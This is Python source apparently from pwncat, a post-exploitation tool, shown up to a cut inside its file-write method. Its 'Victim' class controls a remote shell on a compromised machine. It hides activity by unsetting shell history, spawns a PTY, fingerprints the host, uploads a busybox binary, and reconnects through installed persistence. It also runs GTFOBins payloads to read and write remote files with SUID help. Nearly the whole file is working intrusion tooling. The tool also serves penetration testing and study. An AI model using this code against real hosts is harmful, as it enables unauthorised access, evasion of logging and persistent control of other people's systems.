#!/usr/bin/env python3
import hashlib
import io
import os
import shlex
import socket
import sys
import time
from typing import Dict, Optional, IO, Any, List, Tuple, Iterator, Union

import paramiko
import pkg_resources
import requests
from colorama import Fore
from sqlalchemy.engine import Engine, create_engine
from sqlalchemy.orm import Session, sessionmaker

import pwncat.db
from pwncat import privesc
from pwncat import persist
from pwncat import util
from pwncat.commands import CommandParser
from pwncat.config import Config, KeyType
from pwncat.file import RemoteBinaryPipe
from pwncat.gtfobins import GTFOBins, Capability, Stream
from pwncat.remote import RemoteService
from pwncat.tamper import Tamper, TamperManager
from pwncat.util import State
import pwncat.enumerate


def remove_busybox_tamper():
    """ This is kind of a hack. We need a global callback which can be pickled
    to remove the tamper referencing busybox. Placing this in the global context
    and referencing pwncat.victim vice self allows it to be safely pickled, and
    used in the current session or a future one. """

    pwncat.victim.remove_busybox()


class Victim:
    """ Abstracts interaction with the remote victim host.
    
    :param config: the machine configuration object
    :type config: pwncat.config.Config
    :param state: the current interpreter state
    :type state: pwncat.util.State
    :param saved_term_state: the saved local terminal settings when in raw mode
    :param remote_prompt: the prompt (set in PS1) for the remote shell
    :type remote_propmt: str
    :param binary_aliases: aliases for various binaries that ``self.which`` will look for
    :type binary_aliases: Dict[str, List]
    :param gtfo: the gtfobins module for selecting and generating gtfobins payloads
    :type gtfo: GTFOBins
    :param command_parser: the local command parser module
    :type command_parser: CommandParser
    :param tamper: the tamper module handling remote tamper registration
    :type tamper: TamperManager
    :param privesc: the privilege escalation module
    :type privesc: privesc.Finder
    :param persist: the persistence module
    :type persist: persist.Persistence
    :param engine: the SQLAlchemy database engine
    :type engine: Engine
    :param session: the global SQLAlchemy session
    :type session: Session
    :param host: the pwncat.db.Host object
    :type host: pwncat.db.Host
    """

    OPEN_METHODS = {
        "script-util-linux": "exec {} -qc {} /dev/null 2>&1",
        "script-other": "exec {} -q /dev/null {}",
        "python": "exec {} -c \"import pty; pty.spawn('{}')\" 2>&1",
    }

    INTERESTING_BINARIES = [
        "python",
        "python2",
        "python3",
        "perl",
        "bash",
        "dash",
        "zsh",
        "sh",
        "curl",
        "wget",
        "nc",
        "netcat",
        "ncat",
        "script",
    ]

    def __init__(self):
        """ Initialize a new Pty Handler. This will handle creating the PTY and
        setting the local terminal to raw. It also maintains the state to open a
        local terminal if requested and exit raw mode. """

        # Configuration storage for this victim
        self.config = Config(self)
        # Current user input state
        self._state = None
        # Saved remote terminal state (for transition to/from raw mode)
        self.saved_term_state = util.enter_raw_mode()
        util.restore_terminal(self.saved_term_state, new_line=False)
        # Prompt and prompt prefix
        self.remote_prefix = "\\[\\033[01;31m\\](remote)\\[\\033[00m\\]"
        self.remote_prompt = (
            "\\[\\033[01;33m\\]\\u@\\h\\[\\033[00m\\]:\\["
            "\\033[01;36m\\]\\w\\[\\033[00m\\]\\$ "
        )
        # Aliases for equivalent commands
        self.binary_aliases = {
            "python": [
                "python2",
                "python3",
                "python2.7",
                "python3.6",
                "python3.8",
                "python3.9",
            ],
            "sh": ["bash", "zsh", "dash"],
            "nc": ["netcat", "ncat"],
        }
        # GTFObins manager for this host
        self.gtfo: GTFOBins = GTFOBins(
            pkg_resources.resource_filename("pwncat", "data/gtfobins.json"), self.which
        )
        # Whether the user has pressed the defined prefix
        self.has_prefix = False
        # Parser for local command input
        self.command_parser: CommandParser = CommandParser()
        self.command_parser.setup_prompt()
        # Victim system tamper tracker
        self.tamper: TamperManager = TamperManager()
        # The client socket
        self.client: Optional[socket.SocketType] = None
        # The shell we are running under on the remote host
        self.shell: str = "unknown"
        # A privesc locator/manager
        self.privesc: privesc.Finder = None
        # Persistence manager
        self.persist: persist.Persistence = persist.Persistence()
        # The enumeration manager
        self.enumerate: pwncat.enumerate.Enumerate = pwncat.enumerate.Enumerate()
        # Database engine
        self.engine: Engine = None
        # Database session
        self.session: Session = None
        # The host object as seen by the database
        self.host: pwncat.db.Host = None
        # The current user. This is cached while at the `pwncat` prompt
        # and reloaded whenever returning from RAW mode.
        self.cached_user: str = None

    def reconnect(
        self, hostid: str, requested_method: str = None, requested_user: str = None
    ):
        """
        Reconnect to the host identified by the provided host hash. The host hash can be
        retrieved from the ``sysinfo`` command of a running ``pwncat`` session or from
        the ``host`` table in the database directly. This hash uniquely identifies a host
        even if it's IP changes from your perspective. It is constructed from host-specific
        information probed from the last time ``pwncat`` connected to it.
        
        :param hostid: the unique host hash generated from the last pwncat session
        :param requested_method: the persistence method to utilize for reconnection, if not specified,
            all methods will be tried in order until one works.
        :param requested_user: the user to connect as. if any specified, all users will be tried in
            order until one works. if no method is specified, only methods for this user
            will be tried.
        """

        # Create the database engine, and then create the schema
        # if needed.
        self.engine = create_engine(self.config["db"], echo=False)
        pwncat.db.Base.metadata.create_all(self.engine)

        # Create the session_maker and default session
        self.session_maker = sessionmaker(bind=self.engine)
        self.session = self.session_maker()

        # Load this host from the database
        self.host = self.session.query(pwncat.db.Host).filter_by(hash=hostid).first()
        if self.host is None:
            raise persist.PersistenceError("{hostid}: invalid host hash")

        for username, method in self.persist.installed:
            if requested_method and requested_method != method.name:
                continue
            if requested_user and (
                (requested_user != "root" and method.system)
                or (requested_user != username)
            ):
                continue
            try:
                util.progress(
                    f"attempting host reconnection via {method.format(username)}"
                )
                sock = method.reconnect(username)
                self.connect(sock)
                return
            except persist.PersistenceError:
                continue

        raise persist.PersistenceError("no working persistence methods found")

    @property
    def connected(self):
        return self.client is not None

    def connect(self, client: socket.SocketType):
        """
        Set up the remote client. This socket is assumed to be connected to some form
        of a shell. The remote host will be interrogated to figure out the remote shell
        type, system type, etc. It will then cross-reference the database to identify
        if we have seen this host before, and load relevant data for this host.
        
        :param client: the client socket connection
        :type client: socket.SocketType
        :return: None
        """

        # Create the database engine, and then create the schema
        # if needed.
        if self.engine is None:
            self.engine = create_engine(self.config["db"], echo=False)
            pwncat.db.Base.metadata.create_all(self.engine)

            # Create the session_maker and default session
            if self.session is None:
                self.session_maker = sessionmaker(bind=self.engine)
                self.session = self.session_maker()

        # Initialize the socket connection
        self.client = client

        # We should always get a response within 1 seconds...
        # This is changed in some cases by individual functions, but
        # it will always be returned to one second. This doesn't apply
        # when in raw mode, since we do asynchronous IO in that case.
        # self.client.settimeout(1)

        # Attempt to grab the remote hostname and mac address
        hostname_path = self.run("which hostname").strip().decode("utf-8")
        if hostname_path.startswith("/"):
            hostname = self.run("hostname -f").strip()
        else:
            util.warn("hostname command not found; using peer address")
            hostname = client.getpeername().encode("utf-8")
        mac = None

        # Use ifconfig if available or ip link show.
        ifconfig = self.run("which ifconfig").strip().decode("utf-8")
        if ifconfig.startswith("/"):
            ifconfig_a = self.run(f"{ifconfig} -a").strip().decode("utf-8").lower()
            for line in ifconfig_a.split("\n"):
                if "hwaddr" in line and "00:00:00:00:00:00" not in line:
                    mac = line.split("hwaddr ")[1].split("\n")[0].strip()
                    break
        if mac is None:
            ip = self.run("which ip").strip().decode("utf-8")
            if ip.startswith("/"):
                ip_link_show = self.run("ip link show").strip().decode("utf-8").lower()
                for line in ip_link_show.split("\n"):
                    if "link/ether" in line and "00:00:00:00:00:00" not in line:
                        mac = line.split("link/ether ")[1].split(" ")[0]
                        break

        if mac is None:
            util.warn("no mac address detected; host id only based on hostname!")

        # Calculate the remote host's hash entry for lookup/storage in the database
        # Ideally, this is a hash of the host and mac address. Worst case, it's a hash
        # of "None", which isn't helpful. A middleground is possibly being able to
        # get one or the other, which is also helpful and may happen if hostname isn't
        # available or both ifconfig and "ip" aren't available.
        host_hash = hashlib.md5(hostname + str(mac).encode("utf-8")).hexdigest()

        # Lookup the remote host in our database. If it's not there, create an entry
        self.host = self.session.query(pwncat.db.Host).filter_by(hash=host_hash).first()
        if self.host is None:
            util.info(
                f"new host with hash {host_hash} (hostname: {hostname}, mac: {mac})"
            )
            # Create a new host entry
            self.host = pwncat.db.Host(hash=host_hash)
            # Probe for system information
            self.probe_host_details()
            # Add the host to the session
            self.session.add(self.host)
            # Commit what we know
            self.session.commit()

        # Save the remote host IP address
        self.host.ip = self.client.getpeername()[0]

        # We initialize this here, because it needs the database to initialize
        # the history objects
        self.command_parser.setup_prompt()

        # Ensure history is disabled
        util.info("disabling remote command history", overlay=True)
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")

        util.info("setting terminal prompt", overlay=True)
        self.run("unset PROMPT_COMMAND")
        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")

        self.shell = self.run("ps -o command -p $$ | tail -n 1").decode("utf-8").strip()
        if self.shell.startswith("-"):
            self.shell = self.shell[1:]
        self.shell = self.which(self.shell.split(" ")[0])
        util.info(f"running in {Fore.BLUE}{self.shell}{Fore.RESET}")

        # At this point, the system is functioning, but we don't have a raw terminal/
        # pseudoterminal. Here, we attempt a couple methods of gaining a PTY.
        if self.which("python") is not None:
            method_cmd = Victim.OPEN_METHODS["python"].format(
                self.which("python"), self.shell
            )
            method = "python"
        elif self.which("script") is not None:
            result = self.run("script --version")
            if b"linux" in result:
                method_cmd = f"exec script -qc {self.shell} /dev/null"
                method = "script (util-linux)"
            else:
                method_cmd = f"exec script -q /dev/null {self.shell}"
                method = "script (probably bsd)"
            method = "script"
        else:
            util.error("no available methods to spawn a pty!")
            raise RuntimeError("no available methods to spawn a pty!")

        # Open the PTY
        if not isinstance(self.client, paramiko.Channel):
            util.info(
                f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}",
                overlay=True,
            )
            self.run(method_cmd, wait=False)

        # This stuff won't carry through to the PTY, so we need to reset it again.
        util.info("setting terminal prompt", overlay=True)
        self.run("unset PROMPT_COMMAND")
        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")

        # Make sure HISTFILE is unset in this PTY (it resets when a pty is
        # opened)
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")

        # Disable automatic margins, which fuck up the prompt
        self.run("tput rmam")

        # Now that we have a stable connection, we can create our
        # privesc finder object.
        self.privesc = privesc.Finder()

        # Save our terminal state
        self.stty_saved = self.run("stty -g").decode("utf-8").strip()

        # The session is fully setup now. This unlocks other
        # commands in the command parser, which were blocked before.
        self.command_parser.loaded = True

        # Synchronize the terminals
        self.command_parser.dispatch_line("sync")

        # Force the local TTY to enter raw mode
        self.state = State.RAW

    def bootstrap_busybox(self, url: str):
        """ Utilize the architecture we grabbed from `uname -m` to download a
        precompiled busybox binary and upload it to the remote machine. This
        makes uploading/downloading and dependency tracking easier. It also
        makes file upload/download safer, since we have a known good set of 
        commands we can run (rather than relying on GTFObins)
        
        After installation, busybox version of all non-SUID binaries will be
        returned from ``victim.which`` vice local versions.
        
        :param url: a base url for compiled versions of busybox
        :param type: str
        """

        if self.host.busybox is not None:
            util.success("busybox is already available!")
            return

        busybox_remote_path = self.which("busybox")

        if busybox_remote_path is None:

            # We use the stable busybox version at the time of writing. This should
            # probably be configurable.
            busybox_url = url.rstrip("/") + "/busybox-{arch}"

            # Attempt to download the busybox binary
            r = requests.get(busybox_url.format(arch=self.host.arch), stream=True)

            # No busybox support
            if r.status_code == 404:
                util.warn(f"no busybox for architecture: {self.host.arch}")
                return

            # Grab the original_content length if provided
            length = r.headers.get("Content-Length", None)
            if length is not None:
                length = int(length)

            # Stage a temporary file for busybox
            busybox_remote_path = (
                self.run("mktemp -t busyboxXXXXX").decode("utf-8").strip()
            )

            # Open the remote file for writing
            with self.open(busybox_remote_path, "wb", length=length) as filp:

                # Local function for transferring the original_content
                def transfer(on_progress):
                    for chunk in r.iter_content(chunk_size=1024 * 1024):
                        filp.write(chunk)
                        on_progress(len(chunk))

                # Run the transfer with a progress bar
                util.with_progress(
                    f"uploading busybox for {self.host.arch}", transfer, length,
                )

            # Make busybox executable
            self.run(f"chmod +x {shlex.quote(busybox_remote_path)}")

            # Custom tamper to remove busybox and stop tracking it here
            self.tamper.custom(
                (
                    f"{Fore.RED}installed{Fore.RESET} {Fore.GREEN}busybox{Fore.RESET} "
                    f"to {Fore.CYAN}{busybox_remote_path}{Fore.RESET}"
                ),
                remove_busybox_tamper,
            )

            util.success(
                f"uploaded busybox to {Fore.GREEN}{busybox_remote_path}{Fore.RESET}"
            )

            self.host.busybox_uploaded = True

        else:
            # Busybox was provided on the system!
            util.success(f"busybox already installed on remote system!")
            self.host.busybox_uploaded = False

        # Check what this busybox provides
        util.progress("enumerating provided applets")
        pipe = self.subprocess(f"{shlex.quote(busybox_remote_path)} --list")
        provides = pipe.read().decode("utf-8").strip().split("\n")
        pipe.close()

        # prune any entries which the system marks as SETUID or SETGID
        stat = self.which("stat", quote=True)

        if stat is not None:
            util.progress("enumerating remote binary permissions")
            which_provides = [f"`which {p}`" for p in provides]
            new_provides = []

            with self.subprocess(
                f"{stat} -c %A {' '.join(which_provides)}", "r"
            ) as pipe:
                for name, perms in zip(provides, pipe):
                    perms = perms.decode("utf-8").strip().lower()
                    if "no such" in perms:
                        # The remote system doesn't have this binary
                        continue
                    if "s" not in perms:
                        util.progress(
                            f"keeping {Fore.BLUE}{name}{Fore.RESET} in busybox"
                        )
                        new_provides.append(name)
                    else:
                        util.progress(
                            f"pruning {Fore.RED}{name}{Fore.RESET} from busybox"
                        )

            util.success(f"pruned {len(provides) - len(new_provides)} setuid entries")
            provides = new_provides

        # Let the class know we now have access to busybox
        self.host.busybox = busybox_remote_path

        # Replace anything we provide in our binary cache with the busybox version
        for name in provides:
            binary = (
                self.session.query(pwncat.db.Binary)
                .filter_by(host_id=self.host.id, name=name)
                .first()
            )
            if binary is not None:
                self.session.delete(binary)
            binary = pwncat.db.Binary(name=name, path=f"{busybox_remote_path} {name}")
            self.host.binaries.append(binary)

        self.session.commit()

    def probe_host_details(self):
        """
        Probe the remote host for details such as the installed init system, distribution
        architecture, etc. This information is stored in the database and only retrieved
        for new systems or if the database was removed.
        """

        util.progress("identifying init system")
        with self.open("/proc/1/comm", "r") as filp:
            init = filp.read()

        if "systemd" in init:
            self.host.init = util.Init.SYSTEMD
        elif "upstart" in init:
            self.host.init = util.Init.UPSTART
        elif "sysv" in init:
            self.host.init = util.Init.SYSV

        util.progress("identifying remote kernel version")
        try:
            self.host.kernel = self.env(["uname", "-r"]).strip().decode("utf-8")
        except FileNotFoundError:
            self.host.kernel = "unknown"

        util.progress("identifying remote architecture")
        try:
            self.host.arch = self.env(["uname", "-m"]).strip().decode("utf-8")
        except FileNotFoundError:
            self.host.arch = "unknown"

        util.progress("identifying remote distribution")
        try:
            with self.open("/etc/os-release", "r") as filp:
                for line in filp:
                    if line.startswith("ID="):
                        self.host.distro = line.strip().split("=")[1]
                        break
                else:
                    self.host.distro = "unknown"
        except FileNotFoundError:
            self.host.distro = "unknown"

    def remove_busybox(self):
        """
        Uninstall busybox. This should not be called directly, because it does
        not remove the associated tamper objects that were registered previously.
        """

        for binary in self.host.binaries:
            if self.host.busybox in binary.path:
                self.session.delete(binary)

        # Did we upload a copy of busybox or was it already installed?
        if self.host.busybox_uploaded:
            try:
                self.env(["rm", "-rf", self.host.busybox])
            except FileNotFoundError:
                util.warn(
                    f"rm not found! {self.host.busybox} not removed from filesystem."
                )

            self.host.busybox = None
            self.host.busybox_uploaded = False

    def which(self, name: str, quote=False) -> Optional[str]:
        """
        Resolve the given binary name using the remote shells path. This will
        cache entries for the remote host to speed up pwncat. Further, if busybox
        is installed, it will return busybox version of binaries without asking
        the remote host.
        
        :param name: the name of the remote binary (e.g. "touch").
        :type name: str
        :param quote: whether to quote the returned string with shlex.
        :type quote: bool
        :return: The full path to the requested binary or None if it was not found.
        """

        binary = (
            self.session.query(pwncat.db.Binary)
            .filter_by(name=name, host_id=self.host.id)
            .first()
        )
        if binary is not None:
            path = binary.path
        else:
            path = self.run(f"which {shlex.quote(name)}").strip().decode("utf-8")
            if path == "" or "which: no" in path:
                path = None
            else:
                if path.startswith("bash: ") or len(path.split("\n")) > 1:
                    path = path.split("\n")[-1].strip()
                binary = pwncat.db.Binary(name=name, path=path)
                self.host.binaries.append(binary)

        if name in self.binary_aliases and path is None:
            # Look for aliases of this command as a last resort
            for alias in self.binary_aliases[name]:
                path = self.which(alias, quote=False)
                if path is not None:
                    break

        if quote and path is not None:
            path = shlex.quote(path)

        return path

    def process_input(self, data: bytes):
        r"""
        Process local input from ``stdin``. This is used internally to handle keyboard
        shortcuts and pass data to the remote host when in raw mode.
        
        :param data: the newly entered data
        :type data: bytes
        """

        if self.has_prefix:
            if data == self.config["prefix"].value:
                self.client.send(data)
            else:
                try:
                    binding = self.config.binding(data)

                    # Pass is a special case that can be used at the beginning of a
                    # command.
                    if binding.strip().startswith("pass"):
                        self.client.send(data)
                        binding = binding.lstrip("pass")
                    else:
                        self.restore_local_term()
                        sys.stdout.write("\n")

                        # Update the current user
                        self.update_user()

                        # Evaluate the script
                        self.command_parser.eval(binding, "<binding>")

                        self.flush_output()
                        self.client.send(b"\n")
                        self.saved_term_state = util.enter_raw_mode()

                except KeyError:
                    pass
            self.has_prefix = False
        elif data == self.config["prefix"].value:
            self.has_prefix = True
        elif data == KeyType("c-d").value:
            # Don't allow exiting the remote prompt with C-d
            # you should have a keybinding for "<prefix> C-d" to actually send
            # C-d.
            self.state = State.COMMAND
        else:
            self.client.send(data)

    def recv(self) -> bytes:
        return self.client.recv(4096)

    @property
    def state(self) -> State:
        """
        The current state of ``pwncat``. Changing this property has side-effects
        beyond just modifying a variable. Switching to RAW mode will close the local
        terminal automatically and enter RAW/no-echo mode in the local terminal.
        
        Setting command mode will not return until command mode is exited, and enters
        the CommandProcessor input loop.
        
        Setting SINGLE mode is like COMMAND mode except it will return after one local
        command is entered and executed.
        
        
        :return: pwncat.util.State
        """
        return self._state

    @state.setter
    def state(self, value: State):
        if value == self._state:
            return

        if value == State.RAW:
            self.flush_output()
            self.client.send(b"\n")
            util.success("pwncat is ready 🐈")
            self.saved_term_state = util.enter_raw_mode()
            self.command_parser.running = False
            self._state = value
            return
        if value == State.COMMAND:
            # Go back to normal mode
            self.restore_local_term()
            self._state = State.COMMAND
            # Hopefully this fixes weird cursor position issues
            util.success("local terminal restored")
            # Reload the current user name
            self.update_user()
            # Setting the state to local command mode does not return until
            # command processing is complete.
            self.command_parser.run()
            return
        if value == State.SINGLE:
            # Go back to normal mode
            self.restore_local_term()
            self._state = State.SINGLE
            # Hopefully this fixes weird cursor position issues
            sys.stdout.write("\n")
            # Update the current user
            self.update_user()
            # Setting the state to local command mode does not return until
            # command processing is complete.
            self.command_parser.run_single()

            # Go back to raw mode
            self.flush_output()
            self.client.send(b"\n")
            self.saved_term_state = util.enter_raw_mode()
            self._state = State.RAW
            return

    def restore_local_term(self):
        """
        Restore the local terminal to a normal state (e.g. from raw/no-echo mode).
        """
        util.restore_terminal(self.saved_term_state)

    def env(
        self,
        argv: List[str],
        envp: Dict[str, Any] = None,
        wait: bool = True,
        input: bytes = b"",
        **kwargs,
    ) -> bytes:
        """
        Execute a binary on the remote system. This function acts similar to the
        ``env`` command-line program. The only difference is that there is no way
        to clear the current environment. This will also resolve argv[0] to ensure
        it exists on the remote system.
        
        If the specified binary does not exist on the remote host, a FileNotFoundError
        is raised.
        
        :param argv: the argument list. argv[0] is the command to run.
        :type argv: List[str]
        :param envp: a dictionary of environment variables to set
        :type envp: Dict[str,str]
        :param wait: whether to wait for the command to exit
        :type wait: bool
        :param input: input to send to the command prior to waiting
        :type input: bytes
        :param kwargs: all other keyword arguments are assumed to be environment variables
        :type kwargs: Dict[str, str]
        :return: if ``wait`` is true, returns the command output as bytes. Otherwise, returns None.
        """

        # No environment!
        if envp is None:
            envp = {}

        # Resolve the path
        binary_path = self.which(argv[0])
        if binary_path is None:
            raise FileNotFoundError(f"{binary_path}: No such file or directory")

        # Replace the name with the path
        argv[0] = binary_path

        # Extend the environment with other keyword arguments
        envp.update(kwargs)

        # Build the environment statements
        command = " ".join(
            [f"{util.quote(key)}={util.quote(value)}" for key, value in envp.items()]
        )
        # Join in the command string
        command = f"{command} " + util.join(argv)

        # Run the command
        return self.run(command, wait=wait, input=input)

    def run(self, cmd, wait: bool = True, input: bytes = b"") -> bytes:
        """
        Run a command on the remote host and return the output. This function
        is similar to `env` but takes a string as the input instead of a list
        of arguments. It also does not check that the process exists.

        :param input: the input to automatically pass to the new process
        :type input: bytes
        :param wait: whether to wait for process completion
        :type wait: bool
        :param cmd: the command to run
        :type cmd: str
        """

        sdelim, edelim = self.process(cmd, delim=wait)

        if wait:

            response = self.recvuntil(edelim.encode("utf-8"))
            response = response.split(edelim.encode("utf-8"))[0]
            if sdelim.encode("utf-8") in response:
                response = b"\n".join(response.split(b"\n")[1:])

            self.flush_output()
        else:
            response = edelim.encode("utf-8")

        if callable(input):
            input()
        elif input:
            self.client.send(input)

        return response

    def process(self, cmd, delim=True) -> Tuple[str, str]:
        """
        Start a process on the remote host. This is the underlying logic
        for ``run`` and ``env``. If ``delim`` is true (default), then
        the command is wrapped in random delimeters, which mark the start
        and end of command output. This method will wait for the starting
        delimeter before returning. The output of the command can then be
        retrieved from the ``victim.client`` socket.
        
        :param cmd: the command to run on the remote host
        :type cmd: str
        :param delim: whether to wrap the output in delimeters
        :type delim: bool
        :return: a Tuple of (start_delim, end_delim)
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        sdelim = util.random_string(10)
        edelim = util.random_string(10)

        if delim:
            command = f" echo; echo {sdelim}; {cmd}; echo {edelim}"
        else:
            command = f" {cmd}"

        # Send the command to the remote host
        self.client.send(command.encode("utf-8") + b"\n")

        if delim:
            # Receive until we get our starting delimeter on a line by itself
            while not self.recvuntil(b"\n").startswith(sdelim.encode("utf-8")):
                pass

        return sdelim, edelim

    def subprocess(
        self,
        cmd,
        mode="rb",
        data: bytes = None,
        exit_cmd: str = None,
        no_job=False,
        name: str = None,
    ) -> Union[io.BufferedRWPair, io.BufferedReader]:
        """
        Start a process on the remote host and return a file-like object
        which can be used as stdio for the remote process. Until the returned
        file-like object is closed, no other interaction with the remote host
        can occur (this will result in a deadlock). It is recommended to wrap
        uses of this object in a ``with`` statement:
        
        .. code-block:: python
        
            with pwncat.victim.subprocess("find / -name interesting", "r") as stdout:
                for file_path in stdout:
                    print("Interesting file:", file_path.strip().decode("utf-8"))
        
        
        :param cmd: the command to execute
        :param mode: a mode string like with the standard "open" function
        :param data: data to send to the remote process prior to waiting for output
        :param exit_cmd: a string of bytes to send to the remote process to exit early
            this is needed in case you close the file prior to receiving the ending
            delimeter.
        :param no_job: whether to run as a sub-job in the shell (only used for "r" mode)
        :param name: the name assigned to the output file object
        :return: Union[BufferedRWPair, BufferedReader]
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        for c in mode:
            if c not in "rwb":
                raise ValueError("mode must only contain 'r', 'w' and 'b'")

        sdelim = util.random_string(10)  # "_PWNCAT_STARTDELIM_"
        edelim = util.random_string(10)  # "_PWNCAT_ENDDELIM_"

        # List of ";" separated commands that will be run
        commands: List[str] = []
        # Clear the prompt, or it will get displayed in our output due to the
        # background task
        commands.append(" export PS1=")
        # Needed to disable job control messages in bash
        commands.append("set +m")
        # This is gross, but it allows us to recieve stderr and stdout, while
        # ignoring the job control start message.
        if "w" not in mode and not no_job:
            commands.append(
                f"{{ echo; echo {sdelim}; {cmd} && echo {edelim} || echo {edelim} & }} 2>/dev/null"
            )
        else:
            # This is dangerous. We are in raw mode, and if the process never
            # ends and doesn't provide a way to exit, then we are stuck.
            commands.append(f"echo; echo {sdelim}; {cmd}; echo {edelim}")
        # Re-enable normal job control in bash
        commands.append("set -m")

        # Join them all into one command
        command = ";".join(commands).encode("utf-8")

        # Enter raw mode w/ no echo on the remote terminal
        # DANGER
        if "b" in mode:
            self.raw(echo=False)

        self.client.sendall(command + b"\n")

        while not self.recvuntil(b"\n").startswith(sdelim.encode("utf-8")):
            continue

        # Send the data if requested
        if callable(data):
            data()
        elif data is not None:
            self.client.sendall(data)

        pipe = RemoteBinaryPipe(self, mode, edelim.encode("utf-8"), True, exit_cmd)
        pipe.name = name

        if "w" in mode:
            wrapped = io.BufferedRWPair(pipe, pipe)
            wrapped.name = pipe.name
            pipe = wrapped
        else:
            pipe = io.BufferedReader(pipe)

        return pipe

    def get_file_size(self, path: str):
        """
        Retrieve the size of a remote file. This method raises a FileNotFoundError
        if the remote file does not exist. It may also raise PermissionError if
        the remote file is not readable.
        
        :param path: path to the remote file
        :type path: str
        :return: int
        """

        stat = self.which("stat")
        if stat is None:
            return None

        test = self.which("test")
        if test is None:
            test = self.which("[")

        if test is not None:
            result = self.run(
                f"{test} -e {shlex.quote(path)} && echo exists;"
                f"{test} -r {shlex.quote(path)} && echo readable"
            )
            if b"exists" not in result:
                raise FileNotFoundError(f"No such file or directory: '{path}'")
            if b"readable" not in result:
                raise PermissionError(f"Permission denied: '{path}'")

        size = self.run(f"{stat} -c %s {shlex.quote(path)}").decode("utf-8").strip()
        try:
            size = int(size)
        except ValueError:
            return None

        return size

    def access(self, path: str) -> util.Access:
        """
        Test your access to a file on the remote system. This method utilizes
        the remote ``test`` command to interrogate the given path and it's parent
        directory. If the ``test`` and ``[`` commands are not available, Access.NONE
        is returned.
        
        
        :param path: the remote file path
        :type path: str
        :return: pwncat.util.Access flags
        """

        access: util.Access = util.Access.NONE

        # Find test
        test = self.which("test")
        if test is None:
            test = self.which("[")

        # Quote the path
        parent = shlex.quote(os.path.dirname(path))
        path = shlex.quote(path)

        if test is not None:
            result = self.run(
                f"{test} -x {path} && echo execute;"
                f"{test} -w {path} && echo write;"
                f"{test} -r {path} && echo read;"
                f"{test} -e {path} && echo exists;"
                f"{test} -g {path} && echo sgid;"
                f"{test} -u {path} && echo suid;"
                f"{test} -d {path} && echo directory;"
                f"{test} -f {path} && echo regular;"
                f"{test} -d {parent} && echo parent_dir;"
                f"{test} -w {parent} && echo parent_write"
            )
            if b"execute" in result:
                access |= util.Access.EXECUTE
            if b"exists" in result:
                access |= util.Access.EXISTS
            if b"write" in result or (
                b"parent_write" in result and not b"exists" in result
            ):
                access |= util.Access.WRITE
            if b"read" in result:
                access |= util.Access.READ
            if b"suid" in result:
                access |= util.Access.SUID
            if b"sgid" in result:
                access |= util.Access.SGID
            if b"directory" in result:
                access |= util.Access.DIRECTORY
            elif b"file" in result:
                access |= util.Access.REGULAR
            if b"parent_dir" in result:
                access |= util.Access.PARENT_EXIST
            if b"parent_write" in result:
                access |= util.Access.PARENT_WRITE

        return access

    def open_read(
        self, path: str, mode: str
    ) -> Union[io.BufferedReader, io.TextIOWrapper]:
        """
        This method implements the underlying read logic for the ``open`` method.
        It shouldn't be called directly. It may raise a FileNotFoundError or
        PermissionError depending on access to the requested file.
        
        :param path: the path to the remote file
        :type path: str
        :param mode: the open mode for the remote file (supports "b" and text modes)
        :type mode: str
        :return: Union[io.BufferedReader, io.TextIOWrapper]
        """

        method = None
        binary_path = None
        stream = Stream.ANY

        test = self.which("test")
        if test is None:
            test = self.which("[")

        if test is not None:
            result = self.run(
                f"{test} -e {shlex.quote(path)} && echo exists;"
                f"{test} -r {shlex.quote(path)} && echo readable"
            )
            if b"exists" not in result:
                raise FileNotFoundError(f"No such file or directory: '{path}'")
            if b"readable" not in result:
                raise PermissionError(f"Permission denied: '{path}'")

        # If we want binary transfer, we can't use Stream.PRINT
        if "b" in mode:
            stream = stream & ~Stream.PRINT

        try:
            # Find a reader from GTFObins
            method = next(self.gtfo.iter_methods(caps=Capability.READ, stream=stream))
        except StopIteration:
            raise RuntimeError("no available gtfobins readers!")

        # Build the payload
        payload, input_data, exit_cmd = method.build(lfile=path, suid=True)

        sub_mode = "r"
        no_job = True
        if method.stream is Stream.RAW:
            sub_mode += "b"

        # Run the payload on the remote host.
        pipe = self.subprocess(
            payload,
            sub_mode,
            no_job=no_job,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            name=path,
        )

        # Wrap the pipe in the decoder for this method (possible base64)
        pipe = method.wrap_stream(pipe)

        # Return the appropriate text or binary mode pipe
        if "b" not in mode:
            pipe = io.TextIOWrapper(io.BufferedReader(pipe))

        return pipe

    def open_write(
        self, path: str, mode: str, length=None
    ) -> Union[io.BufferedWriter, io.TextIOWrapper]:
        """
        This method implements the underlying read logic for the ``open`` method.
        It shouldn't be called directly. It may raise a FileNotFoundError or
        PermissionError depending on access to the requested file.

        :param path: the path to the remote file
        :type path: str
        :param mode: the open mode for the remote file (supports "b" and text modes)
        :type mode: str
        :return: Union[io.BufferedWriter, io.TextIOWrapper]
        """

        method = None
        stream = Stream.ANY

        access = self.access(path)
        if util.Access.DIRECTORY in access:
            raise IsADirectoryError(f"Is a directory: '{path}'")
        if util.Access.EXISTS in access and not util.Access.WRITE in access:
            raise PermissionError(f"Permission denied: '{path}'")
        if util.Access.EXISTS not in access:
            if util.Access.PARENT_EXIST not in access:
                raise FileNotFoundError(f"No such file or directory: '{path}' {access}")
            if util.Access.PARENT_WRITE not in access:
                raise PermissionError(f"Permission denied: '{path}'")

        # If we want binary transfer, we can't use Stream.PRINT
        if "b" in mode:
            stream = stream & ~Stream.PRINT

        # We can't do raw streams without a known length
        if length is None:
            stream = stream & ~Stream.RAW

        try:
            # Find a reader from GTFObins
            method = next(self.gtfo.iter_methods(caps=Capability.WRITE, stream=stream))
        except StopIteration:
            raise RuntimeError("no available gtfobins readers!")

        # Build the payload
        payload, input_data, exit_cmd = method.build(
            lfile=path, length=length, suid=True
        )

        sub_mode = "w"
        if method.stream is Stream.RAW:
            sub_mode += "b"

        # Run the payload on the remote host.
        pipe = self.subprocess(
            payload,
            sub_mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            name=path,
        )

        # Wrap the pipe in the decoder for this method (possible base64)
        pipe = method.wrap_stream(pipe)

        # Return the appropriate text or binary mode pipe
        if "b" not in mode:
